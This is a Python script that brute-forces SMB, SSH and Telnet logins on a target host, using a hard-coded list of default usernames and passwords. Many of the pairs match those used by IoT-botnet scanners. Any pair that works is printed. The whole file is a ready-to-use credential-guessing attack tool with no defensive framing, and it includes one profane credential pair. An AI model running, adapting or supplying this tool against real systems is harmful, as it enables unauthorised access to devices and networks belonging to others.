import argparse, telnetlib
from smb.SMBConnection import SMBConnection
from paramiko import SSHClient, AutoAddPolicy, ssh_exception
from time import sleep

pairs = ["pi:raspberry",
         "zathras:password1!",
         "pi:password1!",
         "root:xc3511",
         "root:vizxv",
         "root:admin",
         "admin:admin",
         "root:888888",
         "root:xmhdipc",
         "root:default",
         "root:jauntech",
         "root:123456",
         "root:54321",
         "support:support",
         "admin:password",
         "root:root",
         "root:12345",
         "user:user",
         "root:pass",
         "admin:admin1234",
         "root:1111",
         "admin:smcadmin",
         "admin:1111",
         "root:666666",
         "root:password",
         "root:1234",
         "root:klv123",
         "Administrator:admin",
         "service:service",
         "supervisor:supervisor",
         "guest:guest",
         "guest:12345",
         "admin1:password",
         "administrator:1234",
         "666666:666666",
         "888888:888888",
         "ubnt:ubnt",
         "root:klv1234",
         "root:Zte521",
         "root:hi3518",
         "root:jvbzd",
         "root:anko",
         "root:zlxx.",
         "root:7ujMko0vizxv",
         "root:7ujMko0admin",
         "root:system",
         "root:ikwb",
         "root:dreambox",
         "root:user",
         "root:realtek",
         "root:000000",
         "admin:1111111",
         "admin:1234",
         "admin:12345",
         "admin:54321",
         "admin:123456",
         "admin:7ujMko0admin",
         "admin:pass",
         "admin:meinsm",
         "tech:tech",
         "mother:fucker"]


def brute_force_smb(host):
    for pair in pairs:
        try:
            cred = pair.split(':')
            smb = SMBConnection(username=cred[0], password=cred[1], my_name='', remote_name='',
                                domain='', use_ntlm_v2=True, is_direct_tcp=True)
            response = smb.connect(host, 445, timeout=1)

            if response:
                print(f"{host}:445:{pair}")
                return
        except Exception as e:
            continue


def brute_force_ssh(host):
    try:
        for pair in pairs:
            cred = pair.split(':')
            try:
                client = SSHClient()
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(host, port=22, username=cred[0], password=cred[1], look_for_keys=False, allow_agent=False, timeout=1)
                client.close()
                print(f"{host}:22:{pair}")
                return
            except Exception as e:
                if 'authentication' not in e.__str__.lower():
                    print(e)
                    return -1
            

    except Exception:
        return


def brute_force_telnet(host):
    client = telnetlib.Telnet(host)
    client.read_until(b"login: ")
    for pair in pairs:
        cred = pair.split(":")
        client.write(f"{cred[0]}\n".encode('ascii'))
        client.read_until(b"Password: ")
        client.write(f"{cred[1]}\n".encode('ascii'))
        resp = client.expect([b'login: ', b'Last'])
        if 'incorrect' not in str(resp):
            print(f"{host}:23:{pair}")
            client.close()
            return


parser = argparse.ArgumentParser()
parser.add_argument('--target', required=True)
args = parser.parse_args()

split = args.target.split(':')

port = split[1]

if port == '445':
    brute_force_smb(host=split[0])
elif port == '22':
    brute_force_ssh(host=split[0])
elif port == '23':
    brute_force_telnet(host=split[0])
